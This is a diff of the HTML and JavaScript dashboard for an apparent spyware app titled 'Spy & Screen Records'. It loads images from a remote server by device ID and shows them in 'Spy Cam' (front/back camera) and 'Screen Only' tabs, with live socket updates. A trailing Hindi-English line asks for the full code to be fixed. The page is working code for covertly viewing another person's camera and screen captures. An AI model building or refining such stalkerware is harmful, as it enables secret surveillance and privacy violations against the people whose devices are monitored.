@@ -1,394 +1,384 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Spy & Screen Records</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Spy & Screen Records</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
-    <style>
-        /* --- DARK THEME --- */
-        :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.15);
-            --text-main: #ffffff;
-            --accent-cam: #ff4444; 
-            --accent-screen: #00f3ff; 
-        }
-        body {
-            background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
-            color: var(--text-main);
-            font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 20px;
-            min-height: 100vh;
-        }
+    <style>
+        /* --- DARK THEME & STYLING --- */
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.15);
+            --text-main: #ffffff;
+            --accent-cam: #ff4444; 
+            --accent-screen: #00f3ff; 
+        }
+        body {
+            background-color: var(--bg-color);
+            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 20px;
+            min-height: 100vh;
+        }
 
-        /* --- HEADER --- */
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
-        .back-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            color: #fff; padding: 10px 15px; border-radius: 12px;
-            cursor: pointer; text-decoration: none; font-size: 1rem;
-        }
-        .page-title { font-size: 1.1rem; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+        /* --- HEADER --- */
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .back-btn {
+            background: var(--glass-bg); border: 1px solid var(--glass-border);
+            color: #fff; padding: 10px 15px; border-radius: 12px;
+            cursor: pointer; text-decoration: none; font-size: 1rem;
+        }
+        .page-title { font-size: 1.1rem; font-weight: bold; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* --- TABS --- */
-        .tabs-container {
-            display: flex; gap: 15px; margin-bottom: 25px;
-            background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
-        }
-        .tab-btn {
-            flex: 1; padding: 12px; border: none; outline: none;
-            background: transparent; color: #666;
-            font-size: 0.95rem; font-weight: 600;
-            border-bottom: 2px solid transparent;
-            cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
-        .tab-btn[data-target="camera"].active { border-bottom-color: var(--accent-cam); color: var(--accent-cam); }
-        .tab-btn[data-target="screen"].active { border-bottom-color: var(--accent-screen); color: var(--accent-screen); }
+        /* --- TABS --- */
+        .tabs-container {
+            display: flex; gap: 15px; margin-bottom: 25px;
+            background: rgba(255,255,255,0.03); padding: 8px; border-radius: 15px;
+        }
+        .tab-btn {
+            flex: 1; padding: 12px; border: none; outline: none;
+            background: transparent; color: #666;
+            font-size: 0.95rem; font-weight: 600;
+            border-bottom: 2px solid transparent;
+            cursor: pointer; transition: 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .tab-btn.active { color: #fff; background: rgba(255,255,255,0.05); border-radius: 10px; }
+        .tab-btn[data-target="camera"].active { border-bottom-color: var(--accent-cam); color: var(--accent-cam); }
+        .tab-btn[data-target="screen"].active { border-bottom-color: var(--accent-screen); color: var(--accent-screen); }
 
-        /* --- GRID LAYOUT --- */
-        .gallery-container {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr); /* 2 Photos per row */
-            gap: 15px;
-            padding-bottom: 20px;
-        }
+        /* --- GRID LAYOUT --- */
+        .gallery-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 2 Photos per row */
+            gap: 15px;
+            padding-bottom: 20px;
+        }
 
-        .img-card {
-            background: #000;
-            border-radius: 12px;
-            overflow: hidden;
-            position: relative;
-            border: 1px solid var(--glass-border);
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
-            height: 250px; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .img-card img {
-            width: 100%; 
-            height: 100%; 
-            object-fit: contain; 
-            background-color: #000;
-            transition: transform 0.3s;
-        }
-        .img-card:hover img { transform: scale(1.02); }
+        .img-card {
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid var(--glass-border);
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            height: 250px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .img-card img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            background-color: #000;
+            transition: transform 0.3s;
+        }
+        .img-card:hover img { transform: scale(1.02); }
 
-        .source-badge {
-            position: absolute; bottom: 0; left: 0; right: 0;
-            background: rgba(0,0,0,0.8); color: #fff;
-            font-size: 0.7rem; padding: 6px; text-align: center;
-            text-transform: uppercase; letter-spacing: 0.5px;
-        }
+        .source-badge {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: rgba(0,0,0,0.8); color: #fff;
+            font-size: 0.7rem; padding: 6px; text-align: center;
+            text-transform: uppercase; letter-spacing: 0.5px;
+        }
 
-        /* --- LOAD MORE BUTTON --- */
-        .load-more-container { text-align: center; margin-bottom: 50px; margin-top: 20px; }
-        .btn-load-more {
-            background: #333; color: #fff; border: 1px solid #555;
-            padding: 12px 30px; border-radius: 25px; cursor: pointer;
-            font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px;
-        }
-        .btn-load-more:hover { background: #444; }
+        /* --- LOAD MORE BUTTON --- */
+        .load-more-container { text-align: center; margin-bottom: 50px; margin-top: 20px; }
+        .btn-load-more {
+            background: #333; color: #fff; border: 1px solid #555;
+            padding: 12px 30px; border-radius: 25px; cursor: pointer;
+            font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px;
+        }
+        .btn-load-more:hover { background: #444; }
 
-        /* --- MODAL --- */
-        .modal {
-            display: none; position: fixed; z-index: 1000;
-            left: 0; top: 0; width: 100%; height: 100%;
-            background-color: rgba(0,0,0,0.95);
-            align-items: center; justify-content: center; flex-direction: column;
-            padding: 10px; box-sizing: border-box;
-        }
-        .modal img { 
-            max-width: 100%; max-height: 85vh; 
-            border-radius: 5px; box-shadow: 0 0 20px #000; 
-            object-fit: contain; 
-        }
-        .modal-close { position: absolute; top: 15px; right: 20px; color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 1001; }
-        
-        .modal-actions { margin-top: 15px; display: flex; gap: 20px; }
-        .action-btn {
-            background: #333; color: #fff; padding: 10px 25px;
-            border-radius: 30px; text-decoration: none; font-size: 0.9rem;
-            display: flex; align-items: center; gap: 8px; border: 1px solid #555;
-        }
-        .btn-download { background: var(--accent-screen); color: #000; border: none; font-weight: bold; }
+        /* --- MODAL --- */
+        .modal {
+            display: none; position: fixed; z-index: 1000;
+            left: 0; top: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.95);
+            align-items: center; justify-content: center; flex-direction: column;
+            padding: 10px; box-sizing: border-box;
+        }
+        .modal img { 
+            max-width: 100%; max-height: 80vh; 
+            border-radius: 5px; box-shadow: 0 0 20px #000; 
+            object-fit: contain; 
+        }
+        .modal-close { position: absolute; top: 15px; right: 20px; color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 1001; }
+        
+        .modal-actions { margin-top: 20px; display: flex; gap: 20px; }
+        .action-btn {
+            background: #333; color: #fff; padding: 10px 25px;
+            border-radius: 30px; text-decoration: none; font-size: 0.9rem;
+            display: flex; align-items: center; gap: 8px; border: 1px solid #555;
+        }
+        .btn-download { background: var(--accent-screen); color: #000; border: none; font-weight: bold; }
 
-        /* Loading Spinner */
-        .loader {
-            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent-screen);
-            border-radius: 50%; width: 30px; height: 30px;
-            animation: spin 1s linear infinite; margin: 20px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status-msg { text-align: center; color: #888; margin-top: 50px; }
+        /* Loading Spinner */
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid var(--accent-screen);
+            border-radius: 50%; width: 30px; height: 30px;
+            animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-msg { text-align: center; color: #888; margin-top: 50px; }
 
-    </style>
+    </style>
 </head>
 <body>
 
-    <div class="header">
-        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-        <div class="page-title">Captured Data</div>
-        <div style="width: 40px;"></div> 
-    </div>
+    <div class="header">
+        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <div class="page-title">Captured Data</div>
+        <div style="width: 40px;"></div> 
+    </div>
 
-    <div class="tabs-container">
-        <button class="tab-btn active" data-target="camera" onclick="switchTab('camera')">
-            <i class="fa-solid fa-eye"></i> Spy Cam
-        </button>
-        <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
-            <i class="fa-solid fa-mobile-screen"></i> Screen Only
-        </button>
-    </div>
+    <div class="tabs-container">
+        <button class="tab-btn active" data-target="camera" onclick="switchTab('camera')">
+            <i class="fa-solid fa-eye"></i> Spy Cam
+        </button>
+        <button class="tab-btn" data-target="screen" onclick="switchTab('screen')">
+            <i class="fa-solid fa-mobile-screen"></i> Screen Only
+        </button>
+    </div>
 
-    <div id="loading" class="loader" style="display: none;"></div>
-    
-    <div id="emptyState" class="status-msg" style="display: none;">
-        <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
-        No captures found here.
-    </div>
+    <div id="loading" class="loader" style="display: none;"></div>
+    
+    <div id="emptyState" class="status-msg" style="display: none;">
+        <i class="fa-regular fa-folder-open" style="font-size: 2rem; margin-bottom: 10px;"></i><br>
+        No captures found here.
+    </div>
 
-    <div class="gallery-container" id="galleryGrid"></div>
+    <div class="gallery-container" id="galleryGrid"></div>
 
-    <div class="load-more-container" id="loadMoreArea" style="display: none;">
-        <button class="btn-load-more" onclick="fetchNextPage()">
-            Load More <i class="fa-solid fa-arrow-down"></i>
-        </button>
-    </div>
+    <div class="load-more-container" id="loadMoreArea" style="display: none;">
+        <button class="btn-load-more" onclick="fetchNextPage()">
+            Load More <i class="fa-solid fa-arrow-down"></i>
+        </button>
+    </div>
 
-    <div id="imageModal" class="modal">
-        <span class="modal-close" onclick="closeModal()">&times;</span>
-        <img id="fullImage" src="">
-        <div class="modal-actions">
-            <a id="downloadLink" href="#" download class="action-btn btn-download">
-                <i class="fa-solid fa-download"></i> Save
-            </a>
-            <button onclick="closeModal()" class="action-btn">Close</button>
-        </div>
-    </div>
+    <div id="imageModal" class="modal">
+        <span class="modal-close" onclick="closeModal()">&times;</span>
+        <img id="fullImage" src="">
+        <div class="modal-actions">
+            <a id="downloadLink" href="#" target="_blank" class="action-btn btn-download">
+                <i class="fa-solid fa-download"></i> Open/Save
+            </a>
+            <button onclick="closeModal()" class="action-btn">Close</button>
+        </div>
+    </div>
 
-    <script>
-        // 🔥 SERVER URL
-        const API_BASE = 'https://child-v9no.onrender.com'; 
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
+    <script>
+        // 🔥 SERVER URL
+        const API_BASE = 'https://child-v9no.onrender.com'; 
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
 
-        let allFilesData = []; 
-        let currentFilter = 'camera'; 
-        let nextCursor = null; 
-        let isLoading = false;
+        let allFilesData = []; 
+        let currentFilter = 'camera'; 
+        let nextCursor = null; 
+        let isLoading = false;
 
-        // UI Elements
-        const galleryGrid = document.getElementById('galleryGrid');
-        const loadingSpinner = document.getElementById('loading');
-        const emptyState = document.getElementById('emptyState');
-        const loadMoreArea = document.getElementById('loadMoreArea');
-        const modal = document.getElementById('imageModal');
-        const fullImage = document.getElementById('fullImage');
-        const downloadLink = document.getElementById('downloadLink');
-        const tabs = document.querySelectorAll('.tab-btn');
+        // UI Elements
+        const galleryGrid = document.getElementById('galleryGrid');
+        const loadingSpinner = document.getElementById('loading');
+        const emptyState = document.getElementById('emptyState');
+        const loadMoreArea = document.getElementById('loadMoreArea');
+        const modal = document.getElementById('imageModal');
+        const fullImage = document.getElementById('fullImage');
+        const downloadLink = document.getElementById('downloadLink');
+        const tabs = document.querySelectorAll('.tab-btn');
 
-        // 🔥 1. SOCKET CONNECTION
-        const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
+        // 🔥 1. SOCKET CONNECTION
+        const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
 
-        window.onload = function() {
-            if(!DEVICE_ID) {
-                alert("Device ID Missing!");
-                return;
-            }
-            fetchFiles(true, false); // First load
-            setupSocket();           // Live connection
+        window.onload = function() {
+            if(!DEVICE_ID) {
+                alert("Device ID Missing!");
+                return;
+            }
+            fetchFiles(true, false); 
+            setupSocket();           
 
-            // Auto Refresh
-            setInterval(() => {
-                fetchFiles(true, true);
-            }, 2000); 
-        };
+            // Auto Refresh every 5 seconds
+            setInterval(() => {
+                fetchFiles(true, true);
+            }, 5000); 
+        };
 
-        // ==========================================
-        //  2. FETCH DATA & SORTING
-        // ==========================================
-        
-        function fetchFiles(isReset = false, isBackground = false) {
-            if (isLoading && !isBackground) return; 
-            
-            isLoading = true;
-            if (!isBackground) loadingSpinner.style.display = 'block';
+        // ==========================================
+        //  2. FETCH DATA FROM SERVER
+        // ==========================================
+        function fetchFiles(isReset = false, isBackground = false) {
+            if (isLoading && !isBackground) return; 
+            
+            isLoading = true;
+            if (!isBackground) loadingSpinner.style.display = 'block';
 
-            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
-            if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=20`;
+            if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (!isBackground) loadingSpinner.style.display = 'none';
-                    isLoading = false;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!isBackground) loadingSpinner.style.display = 'none';
+                    isLoading = false;
 
-                    let newFiles = data.photos || [];
-                    
-                    if (data.next_cursor) {
-                        nextCursor = data.next_cursor;
-                        if (!isBackground || loadMoreArea.style.display !== 'block') {
-                             loadMoreArea.style.display = 'block';
-                        }
-                    } else {
-                        nextCursor = null;
-                        loadMoreArea.style.display = 'none';
-                    }
+                    let newFiles = data.photos || [];
+                    
+                    if (data.next_cursor) {
+                        nextCursor = data.next_cursor;
+                        if (!isBackground || loadMoreArea.style.display !== 'block') {
+                             loadMoreArea.style.display = 'block';
+                        }
+                    } else {
+                        nextCursor = null;
+                        loadMoreArea.style.display = 'none';
+                    }
 
-                    const isDataDifferent = JSON.stringify(newFiles) !== JSON.stringify(allFilesData.slice(0, newFiles.length));
+                    const isDataDifferent = JSON.stringify(newFiles) !== JSON.stringify(allFilesData.slice(0, newFiles.length));
 
-                    if (isReset) {
-                        if (isBackground && !isDataDifferent) return; 
-                        allFilesData = newFiles; 
-                    } else {
-                        allFilesData = [...allFilesData, ...newFiles]; 
-                    }
+                    if (isReset) {
+                        if (isBackground && !isDataDifferent) return; 
+                        allFilesData = newFiles; 
+                    } else {
+                        allFilesData = [...allFilesData, ...newFiles]; 
+                    }
 
-                    sortFilesByTime();
-                    renderGallery();
-                })
-                .catch(err => {
-                    console.error("Fetch Error:", err);
-                    if (!isBackground) loadingSpinner.style.display = 'none';
-                    isLoading = false;
-                });
-        }
+                    renderGallery();
+                })
+                .catch(err => {
+                    console.error("Fetch Error:", err);
+                    if (!isBackground) loadingSpinner.style.display = 'none';
+                    isLoading = false;
+                });
+        }
 
-        function fetchNextPage() {
-            if (nextCursor) fetchFiles(false, false);
-        }
+        function fetchNextPage() {
+            if (nextCursor) fetchFiles(false, false);
+        }
 
-        function sortFilesByTime() {
-            allFilesData.sort((a, b) => {
-                const timeA = extractTime(a);
-                const timeB = extractTime(b);
-                return timeB - timeA; 
-            });
-        }
+        // ==========================================
+        //  3. FILTER & RENDER (UPDATED: NO GALLERY)
+        // ==========================================
+        function switchTab(category) {
+            currentFilter = category;
+            
+            tabs.forEach(btn => {
+                btn.classList.remove('active');
+                if(btn.dataset.target === category) btn.classList.add('active');
+            });
 
-        function extractTime(url) {
-            try {
-                const filename = url.split('/').pop(); 
-                const timePart = filename.split('.')[0]; 
-                return Number(timePart) || 0;
-            } catch (e) {
-                return 0;
-            }
-        }
+            renderGallery();
+        }
 
-        // ==========================================
-        //  3. FILTER & RENDER (CORRECTED LOGIC)
-        // ==========================================
-        function switchTab(category) {
-            currentFilter = category;
-            
-            tabs.forEach(btn => {
-                btn.classList.remove('active');
-                if(btn.dataset.target === category) btn.classList.add('active');
-            });
+        function renderGallery() {
+            const filtered = allFilesData.filter(url => {
+                const lowerUrl = url.toLowerCase();
 
-            renderGallery();
-        }
+                // 🛑 BLOCK GALLERY FOLDER
+                // Agar URL me 'gallery' likha hai, toh use dikhana hi nahi hai.
+                if (lowerUrl.includes('gallery')) {
+                    return false;
+                }
 
-        function renderGallery() {
-            const filtered = allFilesData.filter(url => {
-                const lowerUrl = url.toLowerCase();
-                
-                // Exclude any 'gallery' path files first (Since Gallery page is separate)
-                if (lowerUrl.includes('gallery')) return false;
+                // 🔍 IDENTIFY CAMERA
+                const isCamera = lowerUrl.includes('front') || 
+                                 lowerUrl.includes('back') || 
+                                 lowerUrl.includes('cam');
 
-                if (currentFilter === 'camera') {
-                    // TAB 1: Spy Camera
-                    return lowerUrl.includes('front') || lowerUrl.includes('back') || lowerUrl.includes('cam');
-                } else {
-                    // TAB 2: Screen Capture Only (No Gallery)
-                    return lowerUrl.includes('screen') || lowerUrl.includes('shot') || lowerUrl.includes('capture');
-                }
-            });
+                if (currentFilter === 'camera') {
+                    // TAB 1: Spy Cam
+                    return isCamera;
+                } else {
+                    // TAB 2: Screen Only
+                    // Jo camera nahi hai aur gallery nahi hai, wo sab yahan dikhega.
+                    return !isCamera; 
+                }
+            });
 
-            galleryGrid.innerHTML = '';
+            galleryGrid.innerHTML = '';
 
-            if (filtered.length === 0) {
-                emptyState.style.display = 'block';
-                return;
-            } else {
-                emptyState.style.display = 'none';
-            }
+            if (filtered.length === 0) {
+                emptyState.style.display = 'block';
+                return;
+            } else {
+                emptyState.style.display = 'none';
+            }
 
-            filtered.forEach(url => {
-                const div = document.createElement('div');
-                div.className = 'img-card';
-                div.onclick = () => openModal(url);
+            filtered.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'img-card';
+                div.onclick = () => openModal(url);
 
-                let badgeText = "Image";
-                if(url.includes('front')) badgeText = "Front Cam";
-                else if(url.includes('back')) badgeText = "Back Cam";
-                else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen";
+                let badgeText = "Screen Capture"; 
+                if(url.includes('front')) badgeText = "Front Cam";
+                else if(url.includes('back')) badgeText = "Back Cam";
+                else if(url.includes('screen') || url.includes('shot')) badgeText = "Screen Shot";
 
-                div.innerHTML = `
-                    <img src="${url}" loading="lazy" onerror="this.style.display='none'">
-                    <div class="source-badge">${badgeText}</div>
-                `;
-                galleryGrid.appendChild(div);
-            });
-        }
+                div.innerHTML = `
+                    <img src="${url}" loading="lazy" onerror="this.style.display='none'">
+                    <div class="source-badge">${badgeText}</div>
+                `;
+                galleryGrid.appendChild(div);
+            });
+        }
 
-        // ==========================================
-        //  4. REAL-TIME UPDATES
-        // ==========================================
-        function setupSocket() {
-            socket.on('new-file', (data) => {
-                console.log("New file via Socket:", data);
-                if (data.device_id === DEVICE_ID) {
-                    
-                    if (!allFilesData.includes(data.url)) {
-                        allFilesData.unshift(data.url);
-                        sortFilesByTime();
-                    }
-                    
-                    // Don't update if it's a gallery file
-                    if(data.url.includes('gallery') || data.type === 'gallery') return;
+        // ==========================================
+        //  4. REAL-TIME SOCKET
+        // ==========================================
+        function setupSocket() {
+            socket.on('new-file', (data) => {
+                console.log("New file via Socket:", data);
+                if (data.device_id === DEVICE_ID) {
+                    
+                    if (!allFilesData.includes(data.url)) {
+                        allFilesData.unshift(data.url);
+                    }
+                    
+                    let urlLower = data.url.toLowerCase();
+                    
+                    // 🛑 SOCKET SE BHI GALLERY KO ROK DO
+                    if (urlLower.includes('gallery')) return;
 
-                    let isCam = data.url.includes('cam') || data.url.includes('front') || data.url.includes('back');
-                    let isScreen = data.url.includes('screen') || data.url.includes('shot');
+                    let isCam = urlLower.includes('cam') || urlLower.includes('front') || urlLower.includes('back');
+                    
+                    if (currentFilter === 'camera' && isCam) {
+                        renderGallery();
+                    } else if (currentFilter === 'screen' && !isCam) {
+                        renderGallery();
+                    }
+                }
+            });
+        }
 
-                    if ((currentFilter === 'camera' && isCam) || (currentFilter === 'screen' && isScreen)) {
-                        renderGallery(); 
-                    }
-                }
-            });
-        }
+        // ==========================================
+        //  MODAL LOGIC
+        // ==========================================
+        function openModal(url) {
+            fullImage.src = url;
+            downloadLink.href = url;
+            modal.style.display = 'flex';
+        }
 
-        // ==========================================
-        //  MODAL LOGIC
-        // ==========================================
-        function openModal(url) {
-            fullImage.src = url;
-            downloadLink.href = url;
-            modal.style.display = 'flex';
-        }
+        function closeModal() {
+            modal.style.display = 'none';
+            fullImage.src = '';
+        }
 
-        function closeModal() {
-            modal.style.display = 'none';
-            fullImage.src = '';
-        }
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) closeModal();
+        });
 
-        modal.addEventListener('click', function(e) {
-            if (e.target === modal) closeModal();
-        });
-
-    </script>
+    </script>
 </body>
-</html> isa mai sahi kr ke do pura code
-
+</html>
